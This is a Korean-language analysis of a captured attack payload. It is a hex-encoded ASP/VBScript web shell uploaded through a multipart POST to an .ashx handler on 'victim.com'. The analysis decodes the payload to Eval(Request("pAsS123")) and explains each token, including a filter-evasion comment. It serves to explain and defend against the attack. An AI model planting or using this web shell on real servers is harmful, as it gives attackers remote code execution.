
## **📌 예시 코드 1: 서버 측 코드(injection) / 원격 코드 실행(RCE)**

* 서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
  → 기술적으로는 *code injection / remote code execution*이며, 결과적으로 공격자가 스크립트에서 OS 쉘을 호출하도록 코드를 작성하면 **OS 명령 실행도 가능**(command execution으로 이어질 수 있음).

```
<% <!--"--> EXeCute(CON("4556614c2872655155455374282270417353313233222929")) ... End Function %>
------WebKitFormBoundary...--
| POST | https://victim.com/WeChat/UploadHandler.ashx
```

HTTP POST(멀티파트 폼바디) 안에 포함된 것으로 보이며, ASP/VBScript 스타일의 서버 사이드 태그 ` <% ... %>`와 `Execute()`/`Eval()` 호출, 그리고 16진수 문자열이 섞여 있습니다.
멀티파트 바운더리와 `.ashx` 엔드포인트(ASP.NET 핸들러)에 업로드/전송하려는 시도입니다.




### 16진수 문자열 디코딩 

페이로드에 있는 hex:
`4556614c2872655155455374282270417353313233222929`

한 바이트씩 디코딩 하고 결합하면

```
EVaL(reQUEST("pAsS123"))
```

`CON(...)` 함수(아래에서 설명)는 hex를 문자열로 변환하여 `EVaL(reQUEST("pAsS123"))`라는 코드 문자열을 만들고, 그 결과를 `Execute(...)`로 실행한다.



### 코드 흐름(토큰 단위 해석)

* `<% ... %>` : ASP/Classic ASP 서버 스크립트 블록. 서버가 이 내부를 해석·실행함.
* `<!--"-->` : 주석/우회용 텍스트(필터를 깨거나 패턴 매칭을 우회하려는 흔적).
* `EXeCute(...)` : VBScript `Execute` 함수(또는 `ExecuteGlobal`) — 문자열로 받은 코드를 **현재 ASP 스크립트 컨텍스트에서 실행**.
* `CON("...")` : 페이로드 안에 정의된(또는 페이로드가 포함한) 함수로 보이며, 내부에서 hex 문자열을 한 쌍씩 읽어 `Chr(&Hxx)`로 조합해 원본 문자열을 복원합니다(입력은 16진수 인코딩).

  * `CON`은 단순히 hex 디코더 역할: hex → `"EVaL(reQUEST("pAsS123"))"`.
* `EVaL(reQUEST("pAsS123"))` : `Eval(Request("pAsS123"))` 와 동등. `Request("pAsS123")`는 HTTP 파라미터(또는 폼데이터, 쿼리 등)에서 `pAsS123` 값을 읽음. `Eval()`은 이 값을 표현식/코드로 평가(실행)하려 시도.
* 전체적으로: 서버에 이 스크립트가 삽입되면 공격자는 `pAsS123` 파라미터에 임의의 VBScript/PHP·ASP 코드(형식에 맞는 코드)를 보내 서버에서 실행시킬 수 있습니다.

**즉, 이 페이로드는 “서버 내부에 코드(스크립트)를 삽입 → 그 코드를 이용해 요청 파라미터의 내용을 실행”하도록 설계**되어 있는 원격 코드 실행(RCE) 체인입니다.


